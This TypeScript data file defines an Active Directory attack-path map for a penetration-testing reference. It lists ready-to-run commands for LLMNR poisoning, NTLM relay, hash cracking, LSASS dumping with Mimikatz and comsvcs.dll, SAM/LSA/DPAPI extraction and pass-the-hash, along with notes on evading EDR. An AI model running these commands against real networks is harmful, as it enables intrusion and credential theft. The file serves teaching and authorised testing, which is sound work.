import type { AttackEdge, TechniqueNodeDef } from '../schema';

const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Chain 1: "No credentials → foothold → first domain credentials".
 * Ends at the shared `valid-domain-creds` node that the other two chains
 * branch from (a key convergence point in the DAG).
 */
export const initialAccessNodes: TechniqueNodeDef[] = [
  {
    id: 'start',
    label: 'Engagement Start',
    phase: 'recon',
    kind: 'start',
    summary: 'You have network access. Pick a path.',
    description:
      'You are plugged into the internal network (or have a low-privilege foothold). From here the goal is to acquire your first set of valid domain credentials, then escalate toward Domain Admin. Branches below split on what you currently hold: nothing, or an existing low-privilege account.',
    difficulty: 'easy',
  },
  {
    id: 'network-recon',
    label: 'Network Recon',
    phase: 'recon',
    summary: 'Find the DC, hosts, and weak protocols.',
    description:
      'Map the environment before touching anything loud. Identify domain controllers, naming context, hosts with SMB signing disabled (relay targets), and whether legacy name-resolution protocols (LLMNR/NBT-NS/mDNS) are in use.',
    tools: [
      { name: 'nmap', url: 'https://nmap.org/' },
      { name: 'NetExec (nxc)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'fping' },
    ],
    commands: [
      {
        label: 'Find SMB hosts and signing status (relay targets)',
        code: 'nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt',
        lang: 'bash',
      },
      {
        label: 'Locate domain controllers via DNS SRV',
        code: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>',
        lang: 'bash',
      },
    ],
    requires: ['Network access to the internal subnet'],
    mitre: mitre('T1046'),
    references: [
      { label: 'The Hacker Recipes, Recon', url: 'https://www.thehacker.recipes/ad/recon/' },
    ],
    opsec: 'Passive listening and DNS lookups are quiet; full-range nmap scans are noisy and may trip IDS. Prefer targeted scans.',
    difficulty: 'easy',
  },
  {
    id: 'llmnr-poisoning',
    label: 'LLMNR / NBT-NS Poisoning',
    phase: 'initial-access',
    summary: 'Answer broadcast name queries, capture NetNTLMv2.',
    description:
      'When a host fails DNS it falls back to LLMNR/NBT-NS broadcasts. Responder answers "that\'s me", the victim authenticates to you, and you capture its NetNTLMv2 challenge/response. From here you either relay it live or crack it offline.',
    tools: [
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
      { name: 'Inveigh', url: 'https://github.com/Kevin-Robertson/Inveigh' },
    ],
    commands: [
      {
        label: 'Observe without poisoning (analyze mode)',
        code: 'responder -I eth0 -A',
        lang: 'bash',
      },
      {
        label: 'Poison and capture NetNTLMv2',
        code: 'responder -I eth0 -wv',
        lang: 'bash',
      },
    ],
    requires: ['Network access', 'LLMNR/NBT-NS enabled on the segment'],
    mitre: mitre('T1557.001'),
    opsec: 'Responder is detectable: it answers names that should not resolve. Defenders deploy "honey" name lookups to catch it. Run analyze mode (-A) first to observe without poisoning.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, LLMNR/NBT-NS Poisoning & Relay', url: 'https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html' },
    ],
  },
  {
    id: 'ntlm-relay',
    label: 'NTLM Relay',
    phase: 'credential-access',
    summary: 'Relay captured auth to a host without SMB signing.',
    description:
      'Instead of cracking the captured authentication, relay it in real time to another host where SMB signing is not enforced. If the relayed account is a local admin on the target, you get code execution or a dumped SAM: no password ever cracked.',
    tools: [
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Relay to targets, dump SAM on success',
        code: 'ntlmrelayx.py -tf relay_targets.txt -smb2support',
        lang: 'bash',
      },
      {
        label: 'Relay to LDAP for delegation/ACL abuse (needs LDAP signing off)',
        code: 'ntlmrelayx.py -t ldap://dc01 --escalate-user lowpriv',
        lang: 'bash',
      },
    ],
    requires: ['Captured/poisoned authentication', 'For SMB relay: a target with SMB signing NOT enforced', 'For the LDAP relay: LDAP signing / channel binding NOT enforced on the DC'],
    mitre: mitre('T1557.001'),
    opsec: 'Set Responder SMB/HTTP servers to OFF so it forwards to ntlmrelayx instead of competing. Relay leaves authentication logs on the target.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, LLMNR/NBT-NS Spoofing & Relay', url: 'https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html' },
      { label: 'SpecterOps, Relay Your Heart Away (445 Takeover)', url: 'https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac' },
    ],
  },
  {
    id: 'crack-netntlm',
    label: 'Crack NetNTLMv2',
    phase: 'credential-access',
    summary: 'Offline-crack the captured hash to a password.',
    description:
      'If relaying is not viable (signing enforced everywhere), crack the captured NetNTLMv2 hash offline. Success yields a cleartext password and thus valid domain credentials.',
    tools: [
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
      { name: 'john', url: 'https://www.openwall.com/john/' },
    ],
    commands: [
      {
        label: 'Crack NetNTLMv2 (mode 5600)',
        code: 'hashcat -m 5600 captured.txt rockyou.txt -r rules/best64.rule',
        lang: 'bash',
      },
    ],
    requires: ['A captured NetNTLMv2 hash'],
    mitre: mitre('T1110.002'),
    opsec: 'Fully offline: zero footprint on the target once captured.',
    difficulty: 'medium',
  },
  {
    id: 'smb-exec-foothold',
    label: 'Relay to SMB → Exec',
    phase: 'lateral-movement',
    summary: 'Code execution on the relayed/owned host.',
    description:
      'With a relayed session or admin creds, execute commands over SMB (service creation, WMI, or task scheduler) to land an interactive foothold on a domain-joined host.',
    tools: [
      { name: 'Impacket psexec/smbexec/wmiexec', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Semi-interactive shell over SMB',
        code: 'smbexec.py DOMAIN/user@10.0.0.20',
        lang: 'bash',
      },
    ],
    requires: ['Local admin on the target (relayed or owned)'],
    mitre: mitre('T1021.002'),
    opsec: 'psexec creates a service (Event ID 7045), which is loud. wmiexec/smbexec are quieter. Prefer fileless execution.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, PsExec/WinExec (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/psexec-and-winexec.html' },
    ],
  },
  {
    id: 'local-admin-host',
    label: 'Local Admin on Host',
    phase: 'priv-esc',
    summary: 'SYSTEM / local admin on a domain-joined host.',
    description:
      'You hold SYSTEM or local administrator on a domain-joined host: the launchpad for credential theft. Dump LSASS, the SAM/LSA secrets, and DPAPI material to recover cached domain hashes, Kerberos tickets, and sometimes cleartext, then reuse them to move laterally to the next host.',
    requires: ['Local admin / SYSTEM on a host'],
    mitre: mitre('T1078'),
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Dump SAM / LSA / DPAPI remotely (NetExec)',
        code: 'nxc smb <host> -u Administrator -H <NTHASH> --local-auth --sam --lsa --dpapi',
        lang: 'bash',
      },
    ],
    difficulty: 'medium',  },
  {
    id: 'dump-lsass',
    label: 'Dump LSASS',
    phase: 'credential-access',
    summary: 'Extract creds/tickets from memory.',
    description:
      'LSASS holds credential material for logged-on users: NTLM hashes, Kerberos tickets, and sometimes cleartext. Dump it (carefully, EDR watches LSASS closely) to harvest more powerful credentials.',
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'nanodump', url: 'https://github.com/fortra/nanodump' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Classic in-memory dump',
        code: 'sekurlsa::logonpasswords',
        lang: 'powershell',
      },
      {
        label: 'LOLBin minidump (then parse offline)',
        code: 'rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\l.dmp full',
        lang: 'powershell',
      },
      {
        label: 'Dump LSASS remotely (NetExec lsassy)',
        code: 'nxc smb <host> -u user -p pass -M lsassy',
        lang: 'bash',
      },
    ],
    requires: ['Local admin / SYSTEM on the host'],
    mitre: mitre('T1003.001'),
    opsec: 'LSASS access is the single most-monitored action by EDR. Prefer protected-process bypasses, handle duplication, or dumping offline from a minidump.',
    difficulty: 'hard',
    references: [
      { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },
    ],
  },
  {
    id: 'pass-the-hash',
    label: 'Pass-the-Hash',
    phase: 'lateral-movement',
    summary: 'Authenticate with the NT hash, no cracking.',
    description:
      'NTLM authentication only needs the hash, not the password. Reuse a harvested local-admin or domain NT hash to authenticate to other hosts and pivot.',
    tools: [
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Spray a hash across hosts to find admin access',
        code: 'nxc smb hosts.txt -u Administrator -H <NTHASH> --local-auth',
        lang: 'bash',
      },
    ],
    requires: ['An NT hash', 'NTLM authentication permitted'],
    mitre: mitre('T1550.002'),
    opsec: 'NTLM logons are more visible than Kerberos and stand out from a workstation. Watch for "Logon Type 3" anomalies.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, NTLM / Pass-the-Hash', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
    ],
  },
  {
    id: 'valid-domain-creds',
    label: 'Valid Domain Credentials',
    phase: 'enumeration',
    hub: true, // the domain-identity convergence hub: many creds-yielding steps lead back here
    summary: 'A foothold identity to enumerate and escalate from.',
    description:
      "You hold at least one valid domain account (cleartext, hash, or ticket): the baseline for enumeration and escalation. Always check first whether the account is already a local admin somewhere: many domain users administer their own workstation or a cluster of machines, and that standing access is often the intended path. Spray the credential across the estate and watch for NetExec's (Pwn3d!) marker, then jump straight to Local Admin on Host and start dumping.",
    tools: [{ name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      {
        label: 'Find where these creds are already local admin (look for (Pwn3d!))',
        code: 'nxc smb 10.0.0.0/24 -u user -p pass -d domain.local',
        lang: 'bash',
      },
    ],
    requires: ['Any valid domain credential'],
    references: [
      { label: 'NetExec, SMB authentication & (Pwn3d!) check', url: 'https://www.netexec.wiki/smb-protocol/authentication' },
    ],
    mitre: mitre('T1078.002'),
    difficulty: 'easy',  },
  {
    id: 'valid-local-creds',
    label: 'Valid Local Credentials',
    phase: 'initial-access',
    hub: true, // the local-identity convergence hub
    summary: 'A local account on a host, often low-privilege; may need escalation to local admin.',
    description:
      'You hold a valid LOCAL account (not a domain account): a default/weak local login, a cracked SAM hash, or creds from a config file. If it is low-privilege you must escalate locally before you can harvest secrets or pivot. Local admin on a domain-joined host is the gateway to dumping domain credentials.',
    requires: ['Any valid local account on a host'],
    mitre: mitre('T1078.003'),
    difficulty: 'easy',
  },
  {
    id: 'windows-local-privesc',
    label: 'Windows Local Privilege Escalation',
    phase: 'priv-esc',
    summary: 'Escalate a low-priv local user to local admin / SYSTEM.',
    description:
      'From a low-privilege local shell, abuse service / registry / scheduled-task misconfigurations, token privileges (Potato), AlwaysInstallElevated, an unquoted service path, or a kernel exploit to reach SYSTEM. The full technique catalogue lives in the dedicated Windows Priv Esc map.',
    requires: ['A low-privilege local shell on the host'],
    references: [
      {
        label: 'HackTricks, Windows Local Privilege Escalation',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html',
      },
    ],
    mitre: mitre('T1068'),
    difficulty: 'medium',
  },
  {
    id: 'linux-local-privesc',
    label: 'Linux Local Privilege Escalation',
    phase: 'priv-esc',
    summary: 'Escalate a low-priv user to root on a Linux host.',
    description:
      "From a non-root shell on a domain-joined (or standalone) Linux host, abuse sudo misconfigurations and SUID/SGID binaries (GTFOBins), writable cron jobs, dangerous capabilities, PATH / wildcard injection, shared-library hijacking (LD_PRELOAD / LD_LIBRARY_PATH / writable RPATH), NFS no_root_squash, the docker / lxd group, or a kernel exploit to reach root. LinPEAS and pspy surface the quick wins. Root then unlocks the host's Kerberos keytabs and SSSD cache.",
    requires: ['A non-root shell on the host'],
    references: [
      {
        label: 'HackTricks, Linux Privilege Escalation',
        url: 'https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html',
      },
      { label: 'GTFOBins', url: 'https://gtfobins.github.io/' },
      { label: 'PayloadsAllTheThings, Linux Privilege Escalation', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md' },
    ],
    tools: [
      { name: 'LinPEAS (PEASS-ng)', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'GTFOBins', url: 'https://gtfobins.github.io/' },
      { name: 'pspy', url: 'https://github.com/DominicBreuker/pspy' },
    ],
    mitre: mitre('T1068'),
    difficulty: 'medium',
  },
];

export const initialAccessEdges: AttackEdge[] = [
  { source: 'start', target: 'network-recon', label: 'no creds' },
  { source: 'start', target: 'valid-domain-creds', label: 'have an account' },
  { source: 'start', target: 'valid-local-creds', label: 'have a local account' },
  // Low-priv local user -> escalate locally -> local admin (bridges to the PE map).
  // Linear chain only: a direct valid-local-creds -> local-admin-host shortcut
  // would skip a rank and draw its label straight over the Windows-privesc node.
  { source: 'valid-local-creds', target: 'windows-local-privesc', label: 'low-priv user' },
  { source: 'windows-local-privesc', target: 'local-admin-host', label: 'SYSTEM / local admin' },
  // Domain creds that are *already* local admin somewhere (NetExec (Pwn3d!)):
  // standing access is often the intended path, no escalation required.
  { source: 'valid-domain-creds', target: 'local-admin-host', label: 'already local admin (Pwn3d!)' },
  // network-recon -> llmnr-poisoning now routes through the 'Poisoning & Relay' category
  { source: 'llmnr-poisoning', target: 'ntlm-relay', label: 'relay' },
  { source: 'llmnr-poisoning', target: 'crack-netntlm', label: 'crack offline' },
  { source: 'ntlm-relay', target: 'smb-exec-foothold', label: 'SMB signing off' },
  { source: 'crack-netntlm', target: 'valid-domain-creds', label: 'cracked password' },
  { source: 'smb-exec-foothold', target: 'local-admin-host' },
  { source: 'dump-lsass', target: 'pass-the-hash' },
  { source: 'dump-lsass', target: 'valid-domain-creds' },
];
